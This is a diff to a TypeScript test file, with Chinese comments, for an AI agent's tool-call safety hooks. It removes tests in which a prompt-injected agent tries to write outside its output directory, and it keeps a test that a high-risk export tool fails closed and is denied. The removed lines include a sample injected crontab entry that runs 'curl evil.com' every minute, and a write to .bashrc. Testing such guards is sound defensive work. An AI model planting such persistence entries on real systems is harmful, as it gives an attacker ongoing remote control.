@@ -11,11 +11,7 @@
  */
 import assert from "node:assert/strict";
 import { wrapExternalContext } from "../lib/agent/external-context.ts";
-import {
-  createUnwiredToolHook,
-  createPathSafetyHook,
-  createRiskConfirmHook,
-} from "../lib/agent/hooks/built-in.ts";
+import { createRiskConfirmHook } from "../lib/agent/hooks/built-in.ts";
 import { runBeforeHooks } from "../lib/agent/hooks/chain.ts";
 import type { HookContext } from "../lib/agent/hooks/types.ts";
 
@@ -203,67 +199,7 @@ async function main() {
   // "注入能让模型想做坏事,但 hook 让它做不成"
   // ══════════════════════════════════════════════════════════════════════════
 
-  // 3a: Bash 已默认放行（可用性策略）；注入防护改由 path-safety / 确认门等其它层承担
-  {
-    const chain = [createUnwiredToolHook()];
-    const res = await runBeforeHooks(
-      chain,
-      mkCtx({
-        toolName: "Bash",
-        input: { command: "ls" },
-      })
-    );
-    assert.equal(
-      res.behavior,
-      "allow",
-      "3a FAIL: Bash 应被默认放行"
-    );
-    checks += 1;
-  }
-
-  // 3b: 注入诱发 Write 越界(写到 outputDir 外)→ path-safety hook → deny
-  {
-    const chain = [createPathSafetyHook()];
-    const res = await runBeforeHooks(
-      chain,
-      mkCtx({
-        toolName: "Write",
-        input: { file_path: "/etc/crontab", content: "* * * * * curl evil.com" },
-        outputDir: "/tmp/safe-output-dir",
-      })
-    );
-    assert.equal(
-      res.behavior,
-      "deny",
-      "3b FAIL: 注入诱发的越界 Write(/etc/crontab) 应被 path-safety hook deny"
-    );
-    assert.ok(
-      res.message && /输出目录/.test(res.message),
-      "3b FAIL: deny 消息应说明只能写输出目录"
-    );
-    checks += 2;
-  }
-
-  // 3b2: Write 在 outputDir 内 → 正常 allow(守卫不误杀合法操作)
-  {
-    const chain = [createPathSafetyHook()];
-    const res = await runBeforeHooks(
-      chain,
-      mkCtx({
-        toolName: "Write",
-        input: { file_path: "/tmp/safe-output-dir/report.xlsx" },
-        outputDir: "/tmp/safe-output-dir",
-      })
-    );
-    assert.equal(
-      res.behavior,
-      "allow",
-      "3b2 FAIL: 输出目录内的 Write 应被 allow"
-    );
-    checks += 1;
-  }
-
-  // 3c: 高风险工具 export_kingdee_draft,无 resolveUserQuestion 通道 → fail-closed → deny
+  // 高风险工具 export_kingdee_draft,无 resolveUserQuestion 通道 → fail-closed → deny
   {
     const chain = [createRiskConfirmHook()];
     const res = await runBeforeHooks(
@@ -277,37 +213,12 @@ async function main() {
     assert.equal(
       res.behavior,
       "deny",
-      "3c FAIL: 高风险工具无交互通道时应 fail-closed → deny"
+      "高风险工具无交互通道时应 fail-closed → deny"
     );
     assert.ok(
       res.message && /确认|通道/.test(res.message),
-      "3c FAIL: deny 消息应说明需要确认或通道不支持"
+      "deny 消息应说明需要确认或通道不支持"
     );
-    checks += 2;
-  }
-
-  // 3d: 完整 hook 链(unwired + path-safety + risk-confirm)— 组合不互斥
-  {
-    const chain = [createUnwiredToolHook(), createPathSafetyHook(), createRiskConfirmHook()];
-
-    // Bash 默认放行（确认门豁免）
-    const resBash = await runBeforeHooks(
-      chain,
-      mkCtx({ toolName: "Bash", input: { command: "echo ok" } })
-    );
-    assert.equal(resBash.behavior, "allow", "3d FAIL: 完整链对 Bash 应 allow");
-
-    // 越界 Write 在 path-safety 被拦
-    const resWrite = await runBeforeHooks(
-      chain,
-      mkCtx({
-        toolName: "Write",
-        input: { file_path: "/home/user/.bashrc", content: "evil" },
-        outputDir: "/tmp/safe-output-dir",
-      })
-    );
-    assert.equal(resWrite.behavior, "deny", "3d FAIL: 完整链对越界 Write 应 deny");
-
     checks += 2;
   }
 
